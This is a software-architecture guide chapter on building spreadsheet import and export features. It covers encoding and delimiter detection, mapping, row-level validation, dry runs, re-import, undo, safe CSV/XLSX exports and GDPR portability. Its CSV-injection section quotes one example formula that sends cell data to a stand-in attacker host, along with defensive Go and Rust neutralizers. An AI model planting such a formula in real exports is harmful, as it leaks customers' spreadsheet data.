+++
title = "Imports & Exports"
description = "Spreadsheet import as a product feature: encodings, mapping, row-level errors, dry runs, re-import and undo, plus safe CSV and XLSX exports and portability."
category = "Building Blocks"
order = 458
tags = ["architecture", "imports", "exports", "csv", "xlsx", "gdpr"]
+++

Every business application is adopted through a spreadsheet. The new customer's first act is uploading three thousand contacts from their old system, their price list from Excel, last year's jobs from a CSV someone exported in 2019. And sooner or later every customer wants their data back out: for a report, for their accountant, for the next system, or because the law says they can have it.

Import looks like a parsing problem and is mostly a product problem. The file is in an encoding nobody declared, with a delimiter that depends on the country of the laptop that saved it, and columns named whatever the old system called them. Some rows are wrong, some are duplicates of records that already exist, and the person uploading needs to know which and fix them without starting over. Export looks trivial and hides a security hole and a support queue of "the zeros disappeared from our ZIP codes."

My rule: **an import is a reviewable, resumable, reversible batch, never a loop of inserts; an export is a safe, typed file that answers to the same permissions as the screen it came from.** The API side of creating many records at once (batch endpoints, per-item results) is in [Bulk Operations](/docs/requests/bulk-operations); this chapter is the file-in, file-out feature built on top.

## An Import Is a Batch With Stages

Model every import as a record that moves through stages, each one visible to the person who started it:

| Stage | What happens | The person sees |
| --- | --- | --- |
| **Uploaded** | The file is stored and checked | File name, size, rows detected |
| **Parsed** | Encoding, delimiter and header row are detected | A preview of the first rows as columns |
| **Mapped** | Columns are matched to fields | The mapping, editable, with unmapped columns listed |
| **Validated** | Every row is checked and matched to existing records | Counts to create, update, skip and fix, with row-level errors |
| **Committed** | Valid rows are written in chunks | Progress, then a final report |
| **Reverted** (optional) | The batch is undone | What was removed and restored |

That's a workflow with a closed set of states and transitions, and it gets the same treatment as any other ([Workflows & State Machines](/docs/building-blocks/workflows#make-the-states-explicit)): an `import_batches` row with a state, the stored file, the mapping, the counts and a history. The stages between upload and commit change nothing in the tenant's data, so a person can leave halfway through, come back tomorrow and pick up at the mapping screen.

## Upload and Parse

The file arrives the way any upload does: straight to object storage with a scoped credential, checked for size and type before anything opens it ([File Uploads](/docs/building-blocks/file-uploads#keep-bytes-off-the-application)). Then parsing has three guesses to make, and each should be shown to the person rather than trusted silently.

**Encoding.** The WHATWG Encoding Standard calls UTF-8 "the most appropriate encoding for interchange of Unicode," and its decoder treats a byte order mark as "more authoritative than anything else." So:

1. A BOM decides: UTF-8 (`EF BB BF`) or UTF-16 in either byte order.
2. Otherwise, try strict UTF-8. A file that decodes without a single invalid sequence is almost certainly UTF-8.
3. Otherwise, fall back to the legacy encoding the tenant's locale suggests, usually windows-1252 in the Americas and Western Europe (the standard treats the labels `latin1` and `iso-8859-1` as windows-1252), and show the preview so the person can see whether "Müller" came through or turned into mojibake, with a control to pick another encoding.

Never decode with replacement characters and carry on. A `U+FFFD` in a name is data loss that someone finds months later. [Text & Unicode](/docs/fundamentals/text-and-unicode#utf-8-everywhere) covers encodings in general.

**Delimiter.** Comma isn't universal: spreadsheets in locales that write decimals with a comma save "CSV" with semicolons, and exports from other systems use tabs or pipes. Detect it by sampling complete rows and picking the candidate (`,`, `;`, `\t`, `|`) that splits every row into the same number of fields. Python's `csv.Sniffer` does this and is honest about it: "a rough heuristic" that "may produce both false positives and negatives." Show the result and let the person change it.

**Header row.** Usually the first row; sometimes there are title lines above it, or no header at all. Detect it the same way (a row of distinct strings above rows of numbers and dates) and confirm it in the preview.

Parse with a real CSV parser, never by splitting lines on commas. RFC 4180 is the closest thing to a standard (it's Informational, and says it "does not specify an Internet standard of any kind"): fields containing commas, double quotes or line breaks are quoted, and a quote inside a quoted field is doubled. A quoted field can contain a newline, so "line 5 of the file" and "row 5 of the data" aren't the same thing; report errors by row, and keep the line for support. Go's `encoding/csv` follows RFC 4180, can report each field's line and column with `FieldPos`, and has a `LazyQuotes` mode for the malformed quoting that real exports contain.

**Spreadsheets** (XLSX) skip the encoding and delimiter guesses but bring their own. Pick the sheet explicitly when there's more than one. Dates are stored as serial numbers and need the cell's format to read correctly. Numbers carry 15 digits of precision in Excel, so a 16-digit account number typed into a cell has already lost its last digit before it reaches you, and identifiers that were typed as numbers have lost their leading zeros. Read cells formatted as text as text, and warn when an identifier column arrives as numbers.

## Mapping Columns to Fields

Column headers are the old system's vocabulary. Mapping turns them into yours, and it's the step people repeat every month, so it has to be fast the second time.

- **Suggest a mapping** from header names: exact matches on field names and labels, then known aliases ("E-mail," "Email Address," "email" all suggest `email`), then nothing. A wrong guess is worse than an empty one.
- **Every column is mapped or explicitly ignored.** Required fields that aren't mapped block the next stage with a clear message. Unmapped columns are listed, not silently dropped.
- **Custom fields are targets** like built-in ones, validated against their definitions ([Custom Fields](/docs/building-blocks/custom-fields#validating-against-definitions)).
- **Values get mapped too,** not just columns. "Y," "Yes," "TRUE" and "1" become `true`; the old system's status labels become your option keys; "Residential" becomes `residential`. Show each distinct value in an enumerated column with its mapping, and require a decision for the ones that don't match.
- **Save the mapping as a template,** named and keyed by the set of headers it was built for. The next file with the same headers gets it applied automatically, and integrations that drop a file nightly (an SFTP folder, an email inbox) run unattended against a saved template.

Formats need declaring rather than guessing where the data is ambiguous: is `03/04/2026` the 3rd of April or the 4th of March, is `1.234` one thousand or one point two, which time zone are the times in? Infer from the whole column (a value of `25/04/2026` settles the date order), ask when it doesn't settle, and store the answer in the template.

## Validation With Row-Level Errors

Every row goes through the same validation as a create through the API, with the same rules and messages ([Error Responses](/docs/requests/error-responses)). An import that validates differently from the form is a back door for bad data.

- **Errors are per row and per column,** with the row number in the person's file and the original value: "Row 214, Email: `jane@exmaple` is not a valid email address."
- **Validate the whole file before committing anything,** so the report lists every problem at once. Fixing one error per upload is the experience people remember.
- **Give the errors back as a file:** the original rows that failed, with their original columns, plus an `errors` column. The person fixes them in the spreadsheet they already have open and uploads just those rows.
- **Warnings aren't errors.** A missing optional phone number or a date far in the past may be worth a flag but not a refusal; show them separately and let the person proceed.
- **Cap the work, not the person.** Stop collecting errors past a few thousand (the file is probably mapped wrong, and the report should say so), and set file and row limits per plan that are documented and enforced at upload, not discovered at row 900,000.

## Preview and Dry Run

The validation stage is a dry run: it does everything except write. It parses, maps, validates and matches every row against existing records, and reports what the commit would do:

> 2,840 rows: **2,511 new** customers, **291 updates** to existing customers, **12 unchanged**, **26 with errors** (download).

Show a sample of each group, especially the updates with their before and after values, because "update" is where an import does damage: a column mapped to the wrong field overwrites good data on hundreds of records. The commit button applies exactly the plan that was previewed; if the file, mapping or the matched records changed since, revalidate rather than commit a different plan than the one approved.

## Matching, Duplicates and Re-Import

Importing the same file twice must not create every record twice. That needs a **match key**: the field or fields that identify a row's record.

- **External IDs first.** If the source system has its own ID for each record, map it, store it in a crosswalk of external IDs per source, and match on it ([Record Linkage](/docs/building-blocks/record-linkage#crosswalks-of-external-ids)). Re-importing next month's export then updates the same records.
- **Natural keys next:** email for people, SKU for products, invoice number for invoices, chosen per record type and shown to the person as "matched on email."
- **Fuzzy matches are suggestions,** not updates. A row that resembles an existing record by name and address goes to review, by the same rules as any other match-before-create ([Record Linkage](/docs/building-blocks/record-linkage#match-before-create)).
- **Duplicates within the file** are caught too: two rows with the same match key are an error on the second row, or merged by an explicit rule, never two records.
- **The mode is explicit:** create only, update only, or create and update. "Create only" is the safe default for a first import; "update only" is how people bulk-edit a field.
- **Blank means "leave alone."** An empty cell in an update doesn't clear the existing value unless the person chose "blank cells clear values" for that import. Otherwise a sparse spreadsheet wipes everything it doesn't mention.
- **The same file is recognized.** Store a hash of the file and the mapping; uploading an identical file with an identical template offers the previous result instead of a second run.

## Partial Failure

When 26 of 2,840 rows have errors, there are two defensible policies:

- **Import the valid rows** and report the rest. Best for contacts, products and most reference data, where each row stands alone.
- **All or nothing.** Required when rows depend on each other: invoice lines that must sum to their invoice, a chart of accounts, an opening balance import that must balance.

My default is to validate everything first, then let the person choose, with "import the valid rows" preselected for independent records and "all or nothing" enforced for record types whose rows depend on each other. It's the same distinction as independent versus atomic batch endpoints ([Bulk Operations](/docs/requests/bulk-operations#partial-failure)), decided per record type, not left to a flag nobody notices. The failed rows come back as the error file, ready for a second, smaller import.

## Undoing an Import

A wrong import is found an hour later: the columns were shifted, the wrong file was uploaded, the price list was last year's. Make that recoverable.

- **Stamp every row an import writes** with its `import_batch_id`, on created records and in the history of updated ones.
- **Keep the before-image of every updated field,** per batch: the record, the field, the old value and the new value.
- **Revert is a new operation,** not a hard delete of history: it removes the records the batch created (soft-deleted, so references aren't left dangling) and restores the old values of the fields it changed, recorded in the audit trail as a revert by the person who asked ([Audit Trails](/docs/building-blocks/audit-trails#amend-don-t-overwrite)).
- **Don't clobber later work.** A field changed again since the import keeps its newer value, and the revert reports it. A created record that has since gained invoices or activity is reported for a person to decide, not deleted.
- **Undo has a window,** stated on the import screen (a week is plenty for most data), after which the before-images are purged on the retention schedule ([Data Retention](/docs/building-blocks/data-retention#retention-windows)).

## Large Files Run in the Background

Anything past a few thousand rows runs as a job, never inside the upload request ([Background Jobs](/docs/architecture/background-jobs#when-work-leaves-the-request)). The API answers `202 Accepted` with an operation the client polls for progress ([Long-Running Operations](/docs/requests/long-running-operations#the-operation-resource)), and the import screen shows the same progress.

- **Stream, don't load.** Read the file from storage row by row; a 200 MB CSV shouldn't need 200 MB of memory, let alone the multiple of that a parsed object graph takes.
- **Commit in chunks,** a few hundred to a few thousand rows per transaction, with the batch's checkpoint (last committed row) updated in the same transaction. A crashed worker resumes from the checkpoint, and each chunk is idempotent because matching runs again on retry.
- **Stage in bulk, then merge.** For very large imports, `COPY` the parsed rows into a staging table for the batch, validate and match with set-based SQL, then insert and update from it. It's much faster than row-by-row application code, at the cost of validation living in two places, so keep it for the record types that need it.
- **Progress is rows processed out of rows total,** plus counts so far by outcome. A percentage with no numbers looks stuck at 99%.
- **Cancellation stops at the next chunk boundary** and leaves a batch that's partly committed and fully revertible.
- **Fair scheduling.** One tenant's two-million-row import shouldn't delay everyone else's 50-row one; queue imports per tenant with a concurrency limit ([Multi-Tenancy](/docs/architecture/multi-tenancy#noisy-neighbors)).
- **Side effects are batched or suppressed.** Importing 3,000 customers mustn't send 3,000 welcome emails or fire 3,000 webhook deliveries one by one. Decide per record type, and tell the person ("no notifications will be sent").

## Exports

An export is a promise that the file opens correctly in what the person uses, and contains exactly what they were allowed to see.

**Formats.**

- **CSV per RFC 4180,** with a header row, CRLF line endings, fields quoted when they contain a comma, quote or line break, and the `text/csv` media type (with `header=present`). UTF-8 always. Excel's own support page says a UTF-8 CSV opens correctly "if it was saved with BOM," so files meant for spreadsheets start with one; files meant for machines can offer a choice.
- **XLSX** (Office Open XML, ECMA-376) when the person will open it in a spreadsheet and the data has types: dates as dates, money as numbers with a format, and identifiers as text cells so ZIP codes and account numbers keep their leading zeros and digits. A worksheet holds at most 1,048,576 rows and 16,384 columns, and a cell 32,767 characters; an export that could exceed that splits into several sheets or falls back to CSV, rather than silently truncating.
- **JSON** (or JSON Lines for large sets) for machines and for portability, using the same field names and shapes as the API ([JSON Field Conventions](/docs/requests/json-conventions)).

**Content.**

- **What's on the screen is what's in the file:** the same filters, sort and visible columns, plus a "full export" with every field for people who want everything. Custom fields get a column each, headed by their label ([Custom Fields](/docs/building-blocks/custom-fields#everywhere-a-field-goes)).
- **Values are raw, not formatted.** Amounts as plain decimals with a currency column, never `$1,234.50`; timestamps in ISO 8601 with an offset, and the time zone stated in the header or file name; enumerations as their labels with an option to export keys.
- **Exports round-trip.** A file exported from a screen can be edited and imported back with the saved template that matches its headers, using the record IDs it carries as the match key. That's the bulk-edit feature most customers actually want.
- **Permissions apply at export time,** to rows and to columns: a field hidden from a role is absent from that role's export, and an export's size is a signal worth logging. Exports are a favorite way to walk out with a customer list, so they're recorded in the audit trail like reads of sensitive records ([Audit Trails](/docs/building-blocks/audit-trails#log-access-not-just-changes)).

### CSV Injection

A spreadsheet treats a cell that starts with `=`, `+`, `-` or `@` as a formula. If any of your exported values came from users (a name, a note, a product title) then a value like `=HYPERLINK("https://evil.example/?d="&A2,"Click")` becomes a live formula in your customer's spreadsheet, under your brand. OWASP lists the trigger characters as those four plus tab, carriage return and line feed, and full-width variants some locales also treat as formulas.

OWASP's mitigation is to quote every field, prefix a single quote to cells that start with a trigger character, and double any quotes inside. It's also candid that no technique works for every spreadsheet application, and that Excel can drop the protection after a save and reopen. My default:

- **Neutralize free-text values in CSV exports** with a leading `'` when they start with a trigger character, and leave typed columns (amounts, dates, IDs) alone, since a negative amount legitimately starts with `-`.
- **Prefer XLSX for spreadsheet users,** with user-supplied values written as string cells, which a spreadsheet won't evaluate.
- **Offer a raw CSV for machines,** unmodified, labeled as such, because the prefix is data corruption to a program reading the file.

```go tab="Go"
// SpreadsheetSafe neutralizes a user-supplied text value for a CSV that a
// person will open in a spreadsheet. Apply it to free-text columns only:
// typed columns (amounts, dates) can legitimately start with "-".
func SpreadsheetSafe(value string) string {
	if value == "" {
		return value
	}
	r, _ := utf8.DecodeRuneInString(value)
	switch r {
	case '=', '+', '-', '@', '\t', '\r', '\n', '＝', '＋', '－', '＠':
		return "'" + value
	}
	return value
}
```

```rust tab="Rust"
/// Neutralizes a user-supplied text value for a CSV that a person will open in
/// a spreadsheet. Apply it to free-text columns only: typed columns (amounts,
/// dates) can legitimately start with "-".
pub fn spreadsheet_safe(value: &str) -> Cow<'_, str> {
    match value.chars().next() {
        Some('=' | '+' | '-' | '@' | '\t' | '\r' | '\n' | '＝' | '＋' | '－' | '＠') => {
            Cow::Owned(format!("'{value}"))
        }
        _ => Cow::Borrowed(value),
    }
}
```

The CSV writer still does the quoting; this only changes what a spreadsheet will do with the value inside the quotes.

### Large Exports and Expiring Links

An export of a few hundred rows can stream straight back in the response. Anything bigger is a job: the request returns an operation, the job writes the file to object storage, and the person is notified with a link when it's ready ([Long-Running Operations](/docs/requests/long-running-operations#webhooks-on-completion)).

- **The link is a short-lived signed URL,** handed out by your application after checking the person's session and permission, not a long-lived URL sitting in an email. On S3, a presigned URL can be valid for at most 7 days with Signature Version 4, and one created with temporary credentials (an IAM role, as most application servers use) expires when those credentials do, often within hours. Put your own stable link in the email ("download your export"), which signs a fresh URL for a few minutes on each click.
- **Export files are retained briefly,** a few days, then deleted by a lifecycle rule. They're full copies of customer data outside the database, and every one that lingers is a breach waiting for a misconfigured bucket.
- **Exports are snapshots.** Read from a consistent snapshot or a replica, and record the time the data is as of in the file name and the notification.

## Exporting for Data Portability

Under GDPR Article 20, a person has the right to receive the personal data they provided "in a structured, commonly used and machine-readable format" and to have it transmitted to another controller "where technically feasible," when processing is based on consent or a contract and "carried out by automated means." It must not adversely affect the rights and freedoms of others. The broader set of data subject rights and their deadlines is in [GDPR](/docs/compliance/gdpr#data-subject-rights).

A portability export reuses the export machinery, with differences:

- **Scope is a person, not a screen:** every record type holding data they provided, collected by subject ID across the system. Build the list of record types once and keep it with the retention schedule, because the same map serves erasure ([Data Retention](/docs/building-blocks/data-retention#erasure-requests)).
- **Machine-readable means JSON or CSV,** in an archive with one file per record type and a short readme of the fields. A PDF of screenshots isn't portable.
- **Other people's data stays out,** or is reduced to what the person needs: their messages, not the other party's profile.
- **Delivery is to the verified person,** through the same expiring-link flow, after identity checks proportionate to what's in the file. A portability export sent to the wrong address is the breach.
- **Business customers ask for the same thing** for their whole tenant at contract end. A documented, self-serve full export in open formats is what makes leaving possible, and what makes signing less risky for a buyer.

## Checklist

- Imports are batches with stages (uploaded, parsed, mapped, validated, committed, reverted) that change nothing until commit.
- Encoding follows the BOM, then strict UTF-8, then a locale fallback shown in a preview; nothing decodes with replacement characters.
- Delimiter and header row are detected, shown and overridable; parsing uses a real RFC 4180 parser.
- Column and value mappings are suggested, editable and saved as templates keyed by headers; ambiguous formats are declared.
- Validation matches the API, runs over the whole file, reports per row and column, and returns an error file.
- The dry run reports creates, updates, skips and errors before anything is written, and the commit applies exactly that plan.
- Match keys (external IDs, natural keys) make re-imports update instead of duplicate; blank cells leave values alone by default.
- Partial failure policy is per record type; dependent rows import all or nothing.
- Every imported row carries its batch ID, updates keep before-images, and a batch can be reverted within a stated window.
- Large imports stream, commit in checkpointed chunks, report progress, and are scheduled fairly per tenant.
- Exports are RFC 4180 CSV with a BOM for spreadsheets, XLSX with typed and text cells, or JSON; raw values, permissions applied, audited.
- User-supplied text in spreadsheet CSVs is neutralized against formula injection.
- Large exports are jobs with short-lived signed links behind a stable authenticated link, and files expire within days.
- Portability exports cover everything a person provided, in machine-readable formats, delivered only to them.

## References

**Specifications**

- [RFC 4180: Common Format and MIME Type for CSV Files](https://www.rfc-editor.org/rfc/rfc4180), quoting, escaped quotes, CRLF and the `text/csv` type with `charset` and `header` parameters
- [WHATWG Encoding Standard](https://encoding.spec.whatwg.org/), UTF-8 for interchange, BOM sniffing, and `latin1` as a label for windows-1252
- [ECMA-376: Office Open XML File Formats](https://ecma-international.org/publications-and-standards/standards/ecma-376/), the XLSX format, also ISO/IEC 29500
- [GDPR Article 20: Right to data portability](https://gdpr-info.eu/art-20-gdpr/), the structured, machine-readable format and its conditions

**Reference**

- [Go: encoding/csv](https://pkg.go.dev/encoding/csv), RFC 4180 parsing, `LazyQuotes`, `FieldsPerRecord` and `FieldPos` for error positions
- [Python: csv.Sniffer](https://docs.python.org/3/library/csv.html), delimiter and header detection, and its own warning that it's a heuristic
- [Microsoft: Excel specifications and limits](https://support.microsoft.com/en-us/office/excel-specifications-and-limits-1672b34d-7043-467e-8e27-269d656771c3), 1,048,576 rows, 16,384 columns, 32,767 characters per cell and 15-digit precision
- [Microsoft: Opening CSV UTF-8 files correctly in Excel](https://support.microsoft.com/en-us/office/opening-csv-utf-8-files-correctly-in-excel-8a935af5-3416-4edd-ba7e-3dfd2bc4a032), why exports for spreadsheets carry a BOM
- [AWS: Download and upload objects with presigned URLs](https://docs.aws.amazon.com/AmazonS3/latest/userguide/using-presigned-url.html), the 7-day maximum and expiry with temporary credentials

**In practice**

- [OWASP: CSV Injection](https://community.owasp.org/attacks/CSV_Injection), the trigger characters, the quoting and single-quote mitigation, and why no single technique is reliable
